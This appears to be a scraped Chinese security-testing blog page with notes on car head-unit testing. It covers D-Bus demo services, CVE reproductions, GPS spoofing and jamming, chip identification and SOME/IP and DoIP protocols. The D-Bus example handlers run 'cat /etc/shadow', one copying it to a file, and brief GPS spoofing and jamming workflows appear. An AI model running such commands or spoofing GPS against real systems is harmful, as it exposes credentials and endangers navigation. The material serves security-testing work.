<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dbus</span><br><span class="line"><span class="keyword">import</span> dbus.service</span><br><span class="line"><span class="keyword">import</span> dbus.mainloop.glib</span><br><span class="line"><span class="keyword">from</span> gi.repository <span class="keyword">import</span> GLib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExampleDBusService</span>(<span class="params">dbus.service.Object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bus_name</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(bus_name, <span class="string">&#x27;/com/example/MyService&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @dbus.service.method(<span class="params"><span class="string">&#x27;com.example.MyServiceInterface&#x27;</span>, in_signature=<span class="string">&#x27;s&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ProcessData</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;cat /etc/shadow&quot;</span>)</span><br><span class="line">        <span class="comment"># 这里可以添加处理数据的代码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Data processed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    dbus.mainloop.glib.DBusGMainLoop(set_as_default=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    session_bus = dbus.SessionBus()</span><br><span class="line">    bus_name = dbus.service.BusName(<span class="string">&#x27;com.example.MyService&#x27;</span>, session_bus)</span><br><span class="line">    service = ExampleDBusService(bus_name)</span><br><span class="line"></span><br><span class="line">    loop = GLib.MainLoop()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Service started&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        loop.run()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Service stopped&quot;</span>)</span><br><span class="line">        loop.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></div></figure>

<p>C代码为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc dbus_service.c -o dbus_service `pkg-config --cflags --libs dbus-1`</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dbus/dbus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> DBusHandlerResult <span class="title">example_message_handler</span><span class="params">(DBusConnection *conn, DBusMessage *message, <span class="keyword">void</span> *user_data)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;get!&quot;);</span></span><br><span class="line">    system(<span class="string">&quot;cat /etc/shadow &gt; /home/hacker/Desktop/Work/DBus/aaaa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dbus_message_is_method_call(message, <span class="string">&quot;com.example.MyService&quot;</span>, <span class="string">&quot;MyMethod&quot;</span>)) &#123;</span><br><span class="line">        DBusMessage *reply;</span><br><span class="line">        DBusMessageIter args;</span><br><span class="line">        <span class="keyword">char</span>* param = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取参数</span></span><br><span class="line">        <span class="keyword">if</span> (!dbus_message_iter_init(message, &amp;args))</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Message has no arguments!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (DBUS_TYPE_STRING != dbus_message_iter_get_arg_type(&amp;args))</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Argument is not string!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            dbus_message_iter_get_basic(&amp;args, &amp;param);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Called MyMethod with %s\n&quot;</span>, param);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建回复消息</span></span><br><span class="line">        reply = dbus_message_new_method_return(message);</span><br><span class="line">        <span class="keyword">if</span> (!reply) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Out of Memory!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送回复消息</span></span><br><span class="line">        <span class="keyword">if</span> (!dbus_connection_send(conn, reply, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Out of Memory!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dbus_connection_flush(conn);</span><br><span class="line">        dbus_message_unref(reply);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DBUS_HANDLER_RESULT_HANDLED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    DBusConnection* conn;</span><br><span class="line">    DBusError err;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化错误值</span></span><br><span class="line">    dbus_error_init(&amp;err);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到DBus</span></span><br><span class="line">    conn = dbus_bus_get(DBUS_BUS_SESSION, &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (dbus_error_is_set(&amp;err)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Connection Error (%s)\n&quot;</span>, err.message);</span><br><span class="line">        dbus_error_free(&amp;err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == conn) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求路径名</span></span><br><span class="line">    ret = dbus_bus_request_name(conn, <span class="string">&quot;com.example.MyService&quot;</span>, DBUS_NAME_FLAG_REPLACE_EXISTING, &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (dbus_error_is_set(&amp;err)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Name Error (%s)\n&quot;</span>, err.message);</span><br><span class="line">        dbus_error_free(&amp;err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DBUS_REQUEST_NAME_REPLY_PRIMARY_OWNER != ret) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听来自DBus的消息</span></span><br><span class="line">    dbus_connection_add_filter(conn, example_message_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环处理消息</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        dbus_connection_read_write(conn, <span class="number">-1</span>);</span><br><span class="line">        dbus_connection_dispatch(conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>使用如下shell代码向C程序发送信息</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --session           --dest=com.example.MyService           --<span class="built_in">type</span>=method_call           --print-reply           /com/example/MyService           com.example.MyService.MyMethod           string:<span class="string">&quot;aaaaaaa&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>使用如下shell代码向python进程发送信息</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --session           --dest=com.example.MyService           --<span class="built_in">type</span>=method_call           --print-reply           /com/example/MyService           com.example.MyServiceInterface.ProcessData           string:<span class="string">&quot;Hello, DBus!&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>可以用d-feet来查看dbus总线上的东西，另外需要区分session和system总线</p>

        <h1 id="会议"   >
          <a href="#会议" class="heading-link"><i class="fas fa-link"></i></a><a href="#会议" class="headerlink" title="会议"></a>会议</h1>
      <p>刷写：诊断仪刷写</p>
<p>OTA：车机程序调用诊断仪刷写</p>
<p>OTA资质：生产厂家具备</p>
<p>25km/h算作机动车辆</p>
<p>M/N/O各种车型是啥</p>
<p>升级的时候，如果升级之后的系统变更的参数涉及到法规规定的，那么对应的RxSWIN码就会变更。</p>
<p>完整性  测试增删改</p>

        <h1 id="CVE漏洞复现"   >
          <a href="#CVE漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE漏洞复现" class="headerlink" title="CVE漏洞复现"></a>CVE漏洞复现</h1>
      
        <h2 id="CVE-2022-25313"   >
          <a href="#CVE-2022-25313" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2022-25313" class="headerlink" title="CVE-2022-25313"></a>CVE-2022-25313</h2>
      <p>依据<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/libexpat/libexpat/pull/558%EF%BC%8C%E5%AF%B9%E8%BD%A6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95CVE-2022-25313%EF%BC%8C%E5%AF%BC%E5%87%BA%E8%BD%A6%E6%9C%BAexpat%E5%BA%93%EF%BC%8C%E6%94%BE%E5%85%A5%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%EF%BC%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E8%AF%91%E5%8F%82%E6%95%B0" >https://github.com/libexpat/libexpat/pull/558，对车机进行测试CVE-2022-25313，导出车机expat库，放入编译环境，设置编译参数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112431725.png" alt="image-20231129112431725"></p>
<p>创建test.xml测试poc正常功能</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112442035.png" alt="image-20231129112442035"></p>
<p>创建poc.xml测试CVE-2022-25313，将poc，test.xml，poc.xml放入车机</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112454918.png" alt="image-20231129112454918"></p>
<p>运行测试，test.xml正常工作。</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112500631.png" alt="image-20231129112500631"></p>
<p>Poc.xml无法正常工作</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112526793.png" alt="image-20231129112526793"></p>
<p>使用gdb调试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112532102.png" alt="image-20231129112532102"></p>
<p>此时栈空间已达临界值，即将到达临界值</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112537792.png" alt="image-20231129112537792"></p>
<p>再运行指令，访问sp-0x80空间，无法访问</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112541106.png" alt="image-20231129112541106"></p>
<p>触发CWE-400漏洞</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112544838.png" alt="image-20231129112544838"></p>

        <h2 id="CVE-2019-20446"   >
          <a href="#CVE-2019-20446" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2019-20446" class="headerlink" title="CVE-2019-20446"></a>CVE-2019-20446</h2>
      <p>依据<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gitlab.gnome.org/GNOME/librsvg/-/issues/515%E5%AF%B9CVE-2019-20446%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81" >https://gitlab.gnome.org/GNOME/librsvg/-/issues/515对CVE-2019-20446进行验证</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>下载foo.svg，大小为7KB左右，准备类似大小10KB的mySvgTest.svg文件，均传入车机。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112620011.png" alt="image-20231129112620011"></p>
<p>使用rsvg-convert进行对mySvgTest.svg进行功能验证，花费不到1秒完成转换。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112625580.png" alt="image-20231129112625580"></p>
<p>使用rsvg-convert对foo.svg进行测试，等待五分钟也无法完成</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112632871.png" alt="image-20231129112632871"></p>
<p>重新运行，将rsvg-convert放入后台，使用top查看消耗资源，持续占用较高CPU资源</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112644499.png" alt="image-20231129112644499"></p>
<p>经验证，rsvg-convert因为librsvg存在CVE-2019-20446，会触发CWE-400</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129112659839.png" alt="image-20231129112659839"></p>
<p>若车机在处理svg调用到rsvg-convert以及librsvg动态库时，将存在CVE-2019-20446触发CWE-400的风险。</p>

        <h2 id="CVE-2019-9948"   >
          <a href="#CVE-2019-9948" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2019-9948" class="headerlink" title="CVE-2019-9948"></a>CVE-2019-9948</h2>
      <p>python2的一个漏洞</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9948" >CVE - CVE-2019-9948 (mitre.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231129113042220.png" alt="image-20231129113042220"></p>

        <h1 id="GPS测试"   >
          <a href="#GPS测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#GPS测试" class="headerlink" title="GPS测试"></a>GPS测试</h1>
      
        <h2 id="1-GPS静态劫持"   >
          <a href="#1-GPS静态劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-GPS静态劫持" class="headerlink" title="1.GPS静态劫持"></a>1.GPS静态劫持</h2>
      <p>主要下载星历文件后使用gps-sdr-sim生成信号文件，然后用hackrf发送</p>

        <h2 id="2-GPS动态劫持"   >
          <a href="#2-GPS动态劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-GPS动态劫持" class="headerlink" title="2.GPS动态劫持"></a>2.GPS动态劫持</h2>
      <p>需要下载谷歌地球和SatGen Trajectory Generation，生成路径，转换成信号文件发送即可</p>

        <h2 id="3-GPS干扰"   >
          <a href="#3-GPS干扰" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-GPS干扰" class="headerlink" title="3.GPS干扰"></a>3.GPS干扰</h2>
      <p>主要用Gnuradio生成信号干扰流图，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://journals.viserdata.com/index.php/sca/article/view/9351" >车载导航GPS安全研究 | 陶 | 智能城市应用 (viserdata.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>主要依据如下流程图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231205090227662.png" alt="image-20231205090227662"></p>
<p>生成对应的py文件，但是依据上述流程图生成的py文件会无法运行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231205090833365.png" alt="image-20231205090833365"></p>
<p>会少一个Taps需要补充，添加一下即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231205090922989.png" alt="image-20231205090922989"></p>
<p>效果如下</p>
<p><img src="C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20231205091849906.png" alt="image-20231205091849906"></p>

        <h2 id="4-GPS异地信号仿真"   >
          <a href="#4-GPS异地信号仿真" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-GPS异地信号仿真" class="headerlink" title="4.GPS异地信号仿真"></a>4.GPS异地信号仿真</h2>
      <p>异地录制然后发送信号即可</p>

        <h1 id="芯片"   >
          <a href="#芯片" class="heading-link"><i class="fas fa-link"></i></a><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h1>
      <p>大多google或者datasheet</p>
<p>S32K312  BMS采用的芯片：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.coloradmin.cn/o/457624.html?action=onClick" >S32K系列MCU学习介绍 (coloradmin.cn)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>1、NTGAN256T32AC-J1J 2121996EP 3TW<br>nanya的LPDDR4低功耗内存</p>
<p>2、sec 307 B04P KLM8G1GEUF-B04P nv90303l<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://semiconductor.samsung.com/estorage/emmc/emmc-5-1/klm8g1geuf-b04p/" >https://semiconductor.samsung.com/estorage/emmc/emmc-5-1/klm8g1geuf-b04p/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://static6.arrow.com/aropdfconversion/9dd6fa565d4ffe1cc97d44276a9f0a0ddb22fa82/klm8g1geuf-b04p.pdf" >https://static6.arrow.com/aropdfconversion/9dd6fa565d4ffe1cc97d44276a9f0a0ddb22fa82/klm8g1geuf-b04p.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>三星EMMC存储芯片  8G</p>
<p>3、Ublox M9140-ka c1100A 08454356 2240a3<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://content.u-blox.com/sites/default/files/UBX-M9140_ProductSummary_UBX-19027230.pdf" >https://content.u-blox.com/sites/default/files/UBX-M9140_ProductSummary_UBX-19027230.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>ublox 的GNSS 定位芯片</p>
<p>4、Dolphin+ TCC8034 OBX-L HSK1ZZ-2 2249<br>TCC803x (Dolphin+) (ARM Cortex-A53 Quad, Cortex-A7 Quad, Cortex-R5)[6]  CPU芯片</p>
<p>5、LP8864SQ1 2BTG4 AG-1Y<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.alldatasheet.com/datasheet-pdf/pdf/1286986/TI/LP8864S-Q1.html" >https://www.alldatasheet.com/datasheet-pdf/pdf/1286986/TI/LP8864S-Q1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>具有升压控制器的汽车类高效LED 驱动器</p>
<p>6、LM5127Q TI 298 ABXJ G4<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.ti.com.cn/cn/lit/ds/symlink/lm5127-q1.pdf?ts=1699864602436&amp;ref_url=https%253A%252F%252Fwww.google.com.hk%252F" >https://www.ti.com.cn/cn/lit/ds/symlink/lm5127-q1.pdf?ts=1699864602436&amp;ref_url=https%253A%252F%252Fwww.google.com.hk%252F</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>7、ADW 10023Z-0 2232 5889729 PHIL</p>
<p>8、SI47971A0 2128A02A8V e3 TW<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.mouser.com/datasheet/2/472/Si47971_72_short-3051514.pdf" >https://www.mouser.com/datasheet/2/472/Si47971_72_short-3051514.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>配备音频 DSP 子系统的汽车双接收器</p>
<p>9、Winbond 25Q32 JVS AQ 2312<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.winbond.com/hq/support/documentation/downloadV2022.jsp?__locale=en&amp;xmlPath=/support/resources/.content/item/DA00-W25Q32JV_1.html&amp;level=1" >https://www.winbond.com/hq/support/documentation/downloadV2022.jsp?__locale=en&amp;xmlPath=/support/resources/.content/item/DA00-W25Q32JV_1.html&amp;level=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>32Mb的Flash</p>
<p>10、SS3203007 1UR849 1002849000900572</p>
<p>11、TDF8546ATH/N1<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.aipcba.cn/datasheet/pdf/tdf8546athn1118-cm146822571-f48101326.html?page=1" >https://www.aipcba.cn/datasheet/pdf/tdf8546athn1118-cm146822571-f48101326.html?page=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.mouser.in/datasheet/2/302/TDF8546_SDS-3139660.pdf" >https://www.mouser.in/datasheet/2/302/TDF8546_SDS-3139660.pdf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>NXP公司的音频功率放大器芯片</p>

        <h1 id="SOMEIP"   >
          <a href="#SOMEIP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SOMEIP" class="headerlink" title="SOMEIP"></a>SOMEIP</h1>
      <p>简介：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240108140402653.png" alt="image-20240108140402653"></p>
<p>仪表控制，灯光信号控制，座椅控制等等，座仓域</p>
<p>服务类型：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240108141147530.png" alt="image-20240108141147530"></p>
<p>对应概念：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240108141625148.png" alt="image-20240108141625148"></p>
<p>帧结构：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240108141500101.png" alt="image-20240108141500101"></p>
<p>头部报文组成：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240108141610556.png" alt="image-20240108141610556"></p>

        <h1 id="DOIP"   >
          <a href="#DOIP" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOIP" class="headerlink" title="DOIP"></a>DOIP</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240109092453105.png" alt="image-20240109092453105"></p>
<p>依据Logical Address来确定ECU的DoIP实体</p>
<p>诊断</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240109092852925.png" alt="image-20240109092852925"></p>
<p>对应请求报文如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240109092906898.png" alt="image-20240109092906898"></p>
<p>回应：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240109093036111.png" alt="image-20240109093036111"></p>
<p>测试规范：</p>
<p>刷写规范：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240110090155556.png" alt="image-20240110090155556"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240110090138299.png" alt="image-20240110090138299"></p>
<p>BLE蓝牙，secrue connect hosts:False，看这个字段是否为True</p>
<p>随机数符合GM/T 0005-2012</p>

        <h1 id="法规标准"   >
          <a href="#法规标准" class="heading-link"><i class="fas fa-link"></i></a><a href="#法规标准" class="headerlink" title="法规标准"></a>法规标准</h1>
      
        <h2 id="零部件"   >
          <a href="#零部件" class="heading-link"><i class="fas fa-link"></i></a><a href="#零部件" class="headerlink" title="零部件"></a>零部件</h2>
      <p>推荐性国标：GB/T</p>
<p>做过GB/T 40857网关的</p>
<p>针对不同</p>

        <h1 id="MSB大端信号"   >
          <a href="#MSB大端信号" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSB大端信号" class="headerlink" title="MSB大端信号"></a>MSB大端信号</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117161036190.png" alt="image-20240117161036190"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/04/22/IDA%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7/">IDA逆向技巧</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-18</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、修复switch"   >
          <a href="#一、修复switch" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、修复switch" class="headerlink" title="一、修复switch"></a>一、修复switch</h1>
      <p>C++程序用IDA打开好多都不能将switch识别成功，常常需要修复：</p>

        <h2 id="1-找到跳转地址"   >
          <a href="#1-找到跳转地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-找到跳转地址" class="headerlink" title="1.找到跳转地址"></a>1.找到跳转地址</h2>
      <p>常常反汇编之后如下，这个基本就是无法识别switch的时候了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123; jmp     rax &#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-汇编修改"   >
          <a href="#2-汇编修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-汇编修改" class="headerlink" title="2.汇编修改"></a>2.汇编修改</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906161913.png" alt="Snipaste_2021-09-06_16-18-58"></p>
<p>进入到<strong>unk_41D4</strong>，里面放着对应的跳转数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210906165238.png" alt="image-20210906165238427"></p>
<p>按d以4字节为一组对应修改为如下，可见跳转数量有6个</p>
